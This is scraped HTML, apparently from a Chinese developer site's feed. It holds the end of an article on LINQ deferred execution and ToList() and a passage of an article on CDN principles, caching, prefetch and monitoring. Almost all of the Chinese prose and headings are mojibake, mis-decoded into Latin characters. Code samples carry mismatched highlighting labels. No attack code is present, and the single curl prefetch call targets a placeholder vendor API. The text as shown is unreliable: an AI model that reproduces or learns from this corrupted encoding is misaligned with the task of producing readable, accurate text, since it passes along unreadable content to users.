<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">users</span> = db.Users.Where(u =&gt; u.Age &gt; <span class="hljs-number">18</span>).ToList()<span class="hljs-comment">;</span>
users.Add(new User { <span class="hljs-attr">Name</span> = <span class="hljs-string">"New User"</span>, Age = <span class="hljs-number">20</span> })<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-12">4. æ§åˆ¶å†…å­˜ä½¿ç”¨</h3>
<p>å¯¹äºå°å‹æ•°æ®é›†ï¼Œåˆ›å»ºå‰¯æœ¬çš„å†…å­˜å¼€é”€å¯æ¥å—ï¼Œä¸”èƒ½æé«˜ä»£ç å®‰å…¨æ€§ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">smallDataset</span> = largeDataset.Where(item =&gt; item.IsActive).ToList()<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-13">LINQå»¶è¿Ÿæ‰§è¡Œçš„å…¶ä»–æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-14">1. é“¾å¼è°ƒç”¨çš„å»¶è¿Ÿæ€§</h3>
<p>å¤šä¸ªLINQæ“ä½œç¬¦é“¾æ¥åœ¨ä¸€èµ·æ—¶ï¼Œæ•´ä¸ªé“¾éƒ½æ˜¯å»¶è¿Ÿæ‰§è¡Œçš„ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// æ•´ä¸ªé“¾éƒ½æ˜¯å»¶è¿Ÿæ‰§è¡Œçš„
var <span class="hljs-attr">result</span> = collection.Where(item =&gt; item.IsActive)
    .OrderBy(<span class="hljs-attr">item</span> =&gt; item.Name)
    .Select(<span class="hljs-attr">item</span> =&gt; item.Id)<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-15">2. ç«‹å³æ‰§è¡Œçš„æ“ä½œç¬¦</h3>
<p>å¹¶éæ‰€æœ‰LINQæ“ä½œç¬¦éƒ½æ˜¯å»¶è¿Ÿæ‰§è¡Œçš„ï¼Œä»¥ä¸‹æ“ä½œç¬¦ä¼šç«‹å³æ‰§è¡Œï¼š</p>
<ul>
<li>èšåˆå‡½æ•°ï¼š<code>Count()</code>, <code>Sum()</code>, <code>Average()</code>, <code>Min()</code>, <code>Max()</code></li>
<li>å…ƒç´ æ“ä½œï¼š<code>First()</code>, <code>Last()</code>, <code>Single()</code>, <code>ElementAt()</code></li>
<li>è½¬æ¢æ“ä½œï¼š<code>ToList()</code>, <code>ToArray()</code>, <code>ToDictionary()</code></li>
</ul>
<h3 data-id="heading-16">3. å¤šçº¿ç¨‹ç¯å¢ƒä¸‹çš„é£é™©</h3>
<p>åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œå»¶è¿Ÿæ‰§è¡Œå¯èƒ½å¯¼è‡´æ•°æ®ä¸ä¸€è‡´ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// çº¿ç¨‹1ï¼šå®šä¹‰æŸ¥è¯¢
var <span class="hljs-attr">query</span> = sharedCollection.Where(item =&gt; item.IsValid)<span class="hljs-comment">;</span>

// çº¿ç¨‹2ï¼šä¿®æ”¹é›†åˆ
sharedCollection.Add(new Item { <span class="hljs-attr">IsValid</span> = <span class="hljs-literal">true</span> })<span class="hljs-comment">;</span>

// çº¿ç¨‹1ï¼šæ‰§è¡ŒæŸ¥è¯¢ï¼ˆæ­¤æ—¶ç»“æœå·²åŒ…å«çº¿ç¨‹2æ·»åŠ çš„é¡¹ï¼‰
var <span class="hljs-attr">result</span> = query.ToList()<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-17">æœ€ä½³å®è·µæ€»ç»“</h2>
<ol start="0">
<li><strong>å½“éœ€è¦åœ¨æšä¸¾è¿‡ç¨‹ä¸­ä¿®æ”¹åŸå§‹é›†åˆæ—¶</strong>ï¼šä½¿ç”¨<code>ToList()</code>åˆ›å»ºå‰¯æœ¬</li>
<li><strong>å½“éœ€è¦å¤šæ¬¡æšä¸¾åŒä¸€æŸ¥è¯¢ç»“æœæ—¶</strong>ï¼šä½¿ç”¨<code>ToList()</code>é¿å…é‡å¤æ‰§è¡Œ</li>
<li><strong>å½“æŸ¥è¯¢ç»“æœè¾ƒå°ä¸”å†…å­˜å¼€é”€å¯æ¥å—æ—¶</strong>ï¼šä¼˜å…ˆè€ƒè™‘ä½¿ç”¨<code>ToList()</code>æé«˜ä»£ç å®‰å…¨æ€§</li>
<li><strong>å¯¹äºå¤§æ•°æ®é›†</strong>ï¼šæƒè¡¡å†…å­˜ä½¿ç”¨å’Œä»£ç å®‰å…¨æ€§ï¼Œè€ƒè™‘å…¶ä»–è§£å†³æ–¹æ¡ˆ</li>
<li><strong>ç†è§£å»¶è¿Ÿæ‰§è¡Œç‰¹æ€§</strong>ï¼šåœ¨ç¼–å†™LINQæŸ¥è¯¢æ—¶ï¼Œå§‹ç»ˆç‰¢è®°å…¶æ‰§è¡Œæ—¶æœº</li>
</ol>
<h2 data-id="heading-18">ç»“è®º</h2>
<p><code>ToList()</code>ä¸ä»…æ˜¯ä¸€ä¸ªç®€å•çš„é›†åˆè½¬æ¢æ–¹æ³•ï¼Œå®ƒè¿˜æ˜¯è§£å†³LINQé›†åˆä¿®æ”¹å¼‚å¸¸çš„"æ•‘åœºè‹±é›„"ã€‚é€šè¿‡ç†è§£LINQçš„å»¶è¿Ÿæ‰§è¡Œç‰¹æ€§å’Œ<code>ToList()</code>çš„å·¥ä½œåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™å‡ºæ›´å®‰å…¨ã€æ›´é«˜æ•ˆçš„ä»£ç ã€‚</p>
<p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œåˆç†ä½¿ç”¨<code>ToList()</code>å¯ä»¥é¿å…å¾ˆå¤šæ½œåœ¨çš„é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤æ‚çš„é›†åˆæ“ä½œæ—¶ã€‚å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©å¤§å®¶æ›´å¥½åœ°ç†è§£å’Œåº”ç”¨è¿™ä¸ªå¼ºå¤§çš„LINQå·¥å…·ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CDN æŠ€æœ¯æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7582759716188274688</link>    <guid>https://juejin.cn/post/7582759716188274688</guid>    <pubDate>2025-12-12T10:16:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582759716188274688" data-draft-id="7582779306730766371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CDN æŠ€æœ¯æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯,CDN"/> <meta itemprop="datePublished" content="2025-12-12T10:16:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="asing"/> <meta itemprop="url" content="https://juejin.cn/user/1412191054738446"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CDN æŠ€æœ¯æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1412191054738446/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    asing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T10:16:51.000Z" title="Fri Dec 12 2025 10:16:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åºè¨€</h2>
<p>ä» Q3 å¼€å§‹å…¬å¸å¦‚ç«å¦‚è¼å¼€å±•äº†å·ç§°æˆ˜ç•¥çº§çš„é¡¹ç›®ã€Šè½¦å•†åŸã€‹ï¼Œè¯¥é¡¹ç›®æ¨ªè·¨äº† 5 ä¸ª BU ç›¸äº’é…åˆï¼Œç”±äºæˆ‘æ‰€åœ¨çš„ç»„å±äºå‰ç«¯ä¸­å°æ¶æ„ç»„ï¼Œç†æ‰€å½“ç„¶çš„ä¸€äº›ä¸­å°éƒ¨åˆ†å·¥ä½œå°±è½åœ¨äº†æˆ‘ä»¬è¿™è¾¹ï¼Œæ¯”å¦‚æ”¯ä»˜ï¼Œç»“ç®—ï¼Œé€šç”¨è®¢å•è¯¦æƒ…ç­‰ï¼Œåˆšå¥½æˆ‘ä¹‹å‰å°±æ˜¯è´Ÿè´£çš„æ”¯ä»˜ä¾§ï¼Œåœ¨è¿™ä¸ªé¡¹ç›®é‡Œæˆ‘ä¹Ÿé¦–å½“å…¶å†²çš„å†²åœ¨äº†æœ€å‰çº¿ã€‚</p>
<blockquote>
<p>å¥½äº†ï¼Œè¯´äº†ä¸€æ®µåºŸè¯ï¼Œè®²ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦å†™è¿™ç¯‡æ–‡ç« å§ï¼Œåœ¨é¡¹ç›®åˆæœŸçš„è®¾è®¡ï¼Œä¸ºäº†æå‡ç”¨æˆ·ä½“éªŒï¼Œå®Œæˆç§’å¼€ç‡ç­‰æŒ‡æ ‡ï¼ŒæŠŠé™æ€èµ„æº CDN åŠ é€Ÿå¼•å…¥åˆ°äº†é¡¹ç›®æ¶æ„ä¸­æ¥ï¼Œé¡¹ç›®è½åœ°è¿‡ç¨‹ä¸­åœ¨å…¬å¸æ­å»ºçš„ CDN æœåŠ¡çš„ä½¿ç”¨ä¸Šä¹Ÿé‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œéšç€é¡¹ç›®é€æ­¥ä¸Šçº¿ï¼Œå°±æŠŠè¯¥éƒ¨åˆ†ç»™æ€»ç»“ä¸€ä¸‹ç»™å›¢é˜Ÿåˆ†äº«ä¸€ä¸‹æŠ€æœ¯å¿ƒå¾—ã€‚ï¼ˆPSï¼š å·²éšå»ä¸€äº›å†…éƒ¨æ•æ„Ÿéƒ¨åˆ†ï¼‰</p>
</blockquote>
<h2 data-id="heading-1"><strong>ä¸€ã€CDN æ ¸å¿ƒæ¦‚å¿µä¸ä»·å€¼</strong></h2>
<h3 data-id="heading-2"><strong>1.1 ä»€ä¹ˆæ˜¯ CDNï¼Ÿ</strong></h3>
<p>CDNï¼ˆContent Delivery Networkï¼‰ï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œï¼Œæ˜¯é€šè¿‡åœ¨ç°æœ‰äº’è”ç½‘åŸºç¡€ä¸Šæ„å»ºçš„ä¸€å±‚æ™ºèƒ½è™šæ‹Ÿç½‘ç»œï¼Œå°†æºç«™å†…å®¹åˆ†å‘è‡³å…¨çƒå„åœ°çš„è¾¹ç¼˜èŠ‚ç‚¹ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿå°±è¿‘è·å–æ‰€éœ€å†…å®¹ã€‚</p>
<h3 data-id="heading-3"><strong>1.2 ä¸ºä»€ä¹ˆéœ€è¦ CDNï¼Ÿ</strong></h3>
<pre><code class="hljs language-markdown" lang="markdown">ä¼ ç»Ÿè®¿é—®æ¨¡å¼ç—›ç‚¹ï¼š
ç”¨æˆ· â†’ é•¿é€”ç½‘ç»œä¼ è¾“ â†’ æºç«™æœåŠ¡å™¨
<span class="hljs-code">      â†“
é—®é¢˜ï¼šå»¶è¿Ÿé«˜ã€æ‹¥å¡ã€å•ç‚¹æ•…éšœ
      
CDNè®¿é—®æ¨¡å¼ï¼š
ç”¨æˆ· â†’ æœ€è¿‘ CDN èŠ‚ç‚¹ï¼ˆé€šå¸¸&lt;50msï¼‰
      â†“
ä¼˜åŠ¿ï¼šå¿«é€Ÿã€ç¨³å®šã€å¯æ‰©å±•
</span></code></pre>
<h3 data-id="heading-4"><strong>1.3 CDN çš„æ ¸å¿ƒä»·å€¼</strong></h3>






























<table><thead><tr><th>ç»´åº¦</th><th>æ”¶ç›Š</th><th>é‡åŒ–æŒ‡æ ‡</th></tr></thead><tbody><tr><td>æ€§èƒ½</td><td>è®¿é—®é€Ÿåº¦æå‡ 50%-70%</td><td>é¦–å±åŠ è½½æ—¶é—´â†“</td></tr><tr><td>æˆæœ¬</td><td>èŠ‚çœæºç«™å¸¦å®½ 40%-60%</td><td>å¸¦å®½è´¹ç”¨â†“</td></tr><tr><td>å¯ç”¨æ€§</td><td>å¯è¾¾ 99.99%</td><td>SLA æå‡</td></tr><tr><td>å®‰å…¨</td><td>DDoS é˜²æŠ¤èƒ½åŠ›å¢å¼º</td><td>æ”»å‡»æ‹¦æˆªç‡â†‘</td></tr></tbody></table>
<p>Â </p>
<h2 data-id="heading-5"><strong>äºŒã€CDN æ ¸å¿ƒå·¥ä½œåŸç†</strong></h2>
<h3 data-id="heading-6"><strong>2.1 å®Œæ•´è¯·æ±‚æµç¨‹å›¾è§£</strong></h3>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/103bd2ef595e4dd0b1cb2c6ce3de276a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYXNpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766139411&amp;x-signature=mNNki37x%2FQFvh4L35gVqSUyIkUw%3D" alt="è¯·æ±‚æµç¨‹.png" width="30%" loading="lazy"/>
Â 
<h3 data-id="heading-7"><strong>2.2 DNSæ™ºèƒ½è°ƒåº¦æœºåˆ¶</strong></h3>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·è¯·æ±‚æµç¨‹ï¼š
<span class="hljs-bullet">1.</span> ç”¨æˆ·è®¿é—® www.example.com
<span class="hljs-bullet">2.</span> æœ¬åœ° DNS â†’ æƒå¨ DNSï¼ˆCNAME æŒ‡å‘ CDN å‚å•†ï¼‰
<span class="hljs-bullet">3.</span> CDN çš„ DNS åŸºäºä»¥ä¸‹å› ç´ å†³ç­–ï¼š
<span class="hljs-bullet">   -</span> ç”¨æˆ· IP åœ°ç†ä½ç½®
<span class="hljs-bullet">   -</span> è¿è¥å•†çº¿è·¯è´¨é‡
<span class="hljs-bullet">   -</span> èŠ‚ç‚¹å¥åº·çŠ¶æ€
<span class="hljs-bullet">   -</span> å®æ—¶è´Ÿè½½æƒ…å†µ
<span class="hljs-bullet">4.</span> è¿”å›æœ€ä¼˜è¾¹ç¼˜èŠ‚ç‚¹ IP
</code></pre>
<h3 data-id="heading-8"><strong>2.3 ç¼“å­˜å±‚çº§æ¶æ„</strong></h3>
<pre><code class="hljs">ä¸‰å±‚ç¼“å­˜ä½“ç³»ï¼š
è¾¹ç¼˜å±‚ï¼ˆEdgeï¼‰ - æœ€æ¥è¿‘ç”¨æˆ·ï¼Œæ•°é‡æœ€å¤š
åŒºåŸŸå±‚ï¼ˆRegionalï¼‰ - çœçº§/å¤§åŒºçº§èŠ‚ç‚¹
ä¸­å¿ƒå±‚ï¼ˆCoreï¼‰ - å…¨å›½/å…¨çƒçº§æ ¸å¿ƒèŠ‚ç‚¹


å›æºè·¯å¾„ï¼šè¾¹ç¼˜ â†’ åŒºåŸŸ â†’ ä¸­å¿ƒ â†’ æºç«™
</code></pre>
<h2 data-id="heading-9"><strong>ä¸‰ã€CDN å…³é”®æŠ€æœ¯ç‰¹æ€§</strong></h2>
<h3 data-id="heading-10"><strong>3.1 åŠ é€Ÿæ€§èƒ½ä¼˜åŒ–</strong></h3>
<p>é™æ€èµ„æºåŠ é€Ÿï¼š</p>
<ul>
<li>å›¾ç‰‡ã€CSSã€JS ç­‰é™æ€æ–‡ä»¶</li>
<li>ç¼“å­˜å‘½ä¸­ç‡é€šå¸¸ &gt; 95%</li>
<li>æ”¯æŒ HTTP/2ã€QUIC ç­‰æ–°åè®®</li>
</ul>
<p>åŠ¨æ€å†…å®¹åŠ é€Ÿï¼š</p>
<ul>
<li>æ™ºèƒ½è·¯ç”±é€‰æ‹©</li>
<li>TCP ä¼˜åŒ–ï¼ˆæ‹¥å¡æ§åˆ¶ã€çª—å£è°ƒæ•´ï¼‰</li>
<li>é“¾è·¯ä¼˜åŒ–ï¼ˆBGP Anycastï¼‰</li>
</ul>
<h3 data-id="heading-11"><strong>3.2 å®‰å…¨é˜²æŠ¤ä½“ç³»</strong></h3>
<pre><code class="hljs">é˜²æŠ¤å±‚æ¬¡ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   åº”ç”¨å±‚é˜²æŠ¤    â”‚ â† DDoS/CC æ”»å‡»é˜²æŠ¤
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   åè®®å±‚é˜²æŠ¤    â”‚ â† TCP/UDP Flood é˜²æŠ¤
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ç½‘ç»œå±‚é˜²æŠ¤    â”‚ â† å¸¦å®½è€—å°½æ”»å‡»é˜²æŠ¤
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-12"><strong>3.3 è·¨åœ°åŸŸ/è·¨è¿è¥å•†ä¼˜åŒ–</strong></h3>
<pre><code class="hljs language-diff" lang="diff">é—®é¢˜æ ¹æºï¼š
ç”µä¿¡ â†’ è”é€š â†’ ç§»åŠ¨ â†’ æ•™è‚²ç½‘
  â†“      â†“      â†“       â†“
äº’é€šå¸¦å®½æœ‰é™ï¼Œè·¨ç½‘å»¶è¿Ÿé«˜


CDN è§£å†³æ–¹æ¡ˆï¼š
<span class="hljs-deletion">- å¤šçº¿ BGP æ¥å…¥</span>
<span class="hljs-deletion">- è¿è¥å•†æ·±åº¦åˆä½œ</span>
<span class="hljs-deletion">- è¾¹ç¼˜èŠ‚ç‚¹è¦†ç›–æ‰€æœ‰è¿è¥å•†</span>
</code></pre>
<h2 data-id="heading-13"><strong>å››ã€CDN ç¼“å­˜è§£æ</strong></h2>
<h3 data-id="heading-14"><strong>4.1 ç¼“å­˜å·¥ä½œæœºåˆ¶</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec0b95d74d24b23b3d14d1d998e144c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYXNpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766139411&amp;x-signature=5qANvvmJxnHhFElOVUSp36QVphg%3D" alt="ç¼“å­˜æœºåˆ¶.png" loading="lazy"/></p>
<h3 data-id="heading-15"><strong>4.2 ç¼“å­˜æ›´æ–°ç­–ç•¥å¯¹æ¯”</strong></h3>



































<table><thead><tr><th>ç­–ç•¥</th><th>åŸç†</th><th>é€‚ç”¨åœºæ™¯</th><th>ä¼˜ç¼ºç‚¹</th></tr></thead><tbody><tr><td>è¢«åŠ¨æ›´æ–°</td><td>ç¼“å­˜å¤±æ•ˆæ—¶å›æº</td><td>æ›´æ–°ä¸é¢‘ç¹çš„å†…å®¹</td><td>ç®€å•ï¼Œä½†æœ‰å»¶è¿Ÿ</td></tr><tr><td>ä¸»åŠ¨é¢„çƒ­</td><td>æå‰æ¨é€è‡³CDN</td><td>é‡è¦æ´»åŠ¨ã€æ–°å“å‘å¸ƒ</td><td>ä½“éªŒå¥½ï¼Œæˆæœ¬ç•¥é«˜</td></tr><tr><td>ç‰ˆæœ¬åŒ– URL</td><td>URL å¸¦ç‰ˆæœ¬å·æˆ–å“ˆå¸Œ</td><td>é™æ€èµ„æºæ›´æ–°</td><td>ç¼“å­˜æ§åˆ¶ç²¾å‡†</td></tr><tr><td>æ—¶é—´æˆ³å‚æ•°</td><td>URL å¸¦æ—¶é—´æˆ³å‚æ•°</td><td>å¼€å‘è°ƒè¯•é˜¶æ®µ</td><td>ç®€å•ä½†ç¼“å­˜å‘½ä¸­ç‡ä½</td></tr></tbody></table>
<p>Â </p>
<h3 data-id="heading-16"><strong>4.3 CDN é¢„çƒ­è¯¦è§£</strong></h3>
<ol>
<li><strong>ä»€ä¹ˆæ˜¯é¢„çƒ­ï¼Ÿ</strong></li>
</ol>
<p>é¢„çƒ­æ˜¯æŒ‡ä¸»åŠ¨å°†å†…å®¹æ¨é€åˆ° CDN è¾¹ç¼˜èŠ‚ç‚¹ï¼Œè€Œä¸æ˜¯ç­‰å¾…ç”¨æˆ·é¦–æ¬¡è®¿é—®æ—¶æ‰å›æºæ‹‰å–ã€‚</p>
<p>Â </p>
<ol start="2">
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦é¢„çƒ­ï¼Ÿ</strong></li>
</ol>

<pre><code class="hljs language-css" lang="css">é¦–æ¬¡è®¿é—®é—®é¢˜ï¼š
ç”¨æˆ·<span class="hljs-selector-tag">A</span>è¯·æ±‚æ–°èµ„æº â†’ CDNæœªç¼“å­˜ â†’ å›æºæ‹‰å–ï¼ˆæ…¢ï¼‰
é¢„çƒ­è§£å†³ï¼š
æå‰æ¨é€èµ„æºåˆ°CDN â†’ æ‰€æœ‰ç”¨æˆ·éƒ½å¿«é€Ÿè®¿é—®
</code></pre>
<p>3.  <strong>é¢„çƒ­å®æ–½æ–¹å¼ï¼š</strong></p>
<p>API ä¸»åŠ¨æ¨é€</p>
<pre><code class="hljs language-vbnet" lang="vbnet"># ä½¿ç”¨ CDN å‚å•† API æ¥å£
curl -X POST <span class="hljs-string">"https://cdn-api.example.com/prefetch"</span> \
  -H <span class="hljs-string">"Authorization: Bearer YOUR_TOKEN"</span> \
  -d <span class="hljs-comment">'{</span>
    <span class="hljs-string">"urls"</span>: [
      <span class="hljs-string">"https://cdn.example.com/product/new.jpg"</span>,
      <span class="hljs-string">"https://cdn.example.com/static/v2.0/app.js"</span>
    ]
  }<span class="hljs-comment">'</span>
</code></pre>
<p>Â </p>
<ol start="4">
<li><strong>é¢„çƒ­ vs åˆ·æ–°ï¼š</strong></li>
</ol>























<table><thead><tr><th>æ“ä½œ</th><th>ç›®çš„</th><th>æ—¶æœº</th><th>å½±å“</th></tr></thead><tbody><tr><td>é¢„çƒ­</td><td>æå‰å¡«å……ç¼“å­˜</td><td>å†…å®¹å‘å¸ƒå‰</td><td>æ”¹å–„é¦–æ¬¡è®¿é—®ä½“éªŒ</td></tr><tr><td>åˆ·æ–°</td><td>å¼ºåˆ¶æ›´æ–°ç¼“å­˜</td><td>å†…å®¹æ›´æ–°å</td><td>ç¡®ä¿ç”¨æˆ·è·å–æœ€æ–°å†…å®¹</td></tr></tbody></table>
<p>Â </p>
<h2 data-id="heading-17"><strong>äº”ã€CDNåº”ç”¨åœºæ™¯</strong></h2>
<h3 data-id="heading-18"><strong>5.1 åœºæ™¯åŒ–é…ç½®æ–¹æ¡ˆ</strong></h3>
<p>ç”µå•†ç½‘ç«™æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs">é™æ€èµ„æºï¼šé•¿æœŸç¼“å­˜ï¼ˆ30å¤©ï¼‰
å•†å“å›¾ç‰‡ï¼šç‰ˆæœ¬åŒ–ç®¡ç†
æ´»åŠ¨é¡µé¢ï¼šé¢„çƒ­+çŸ­ç¼“å­˜ï¼ˆ5åˆ†é’Ÿï¼‰
APIæ¥å£ï¼šåŠ¨æ€åŠ é€Ÿ+é€‚å½“ç¼“å­˜
</code></pre>
<h3 data-id="heading-19"><strong>5.2 ç›‘æ§ä¸å‘Šè­¦</strong></h3>
<pre><code class="hljs language-markdown" lang="markdown">å…³é”®ç›‘æ§æŒ‡æ ‡ï¼š
<span class="hljs-bullet">1.</span> å‘½ä¸­ç‡ï¼ˆ&gt;95%ä¸ºå¥åº·ï¼‰
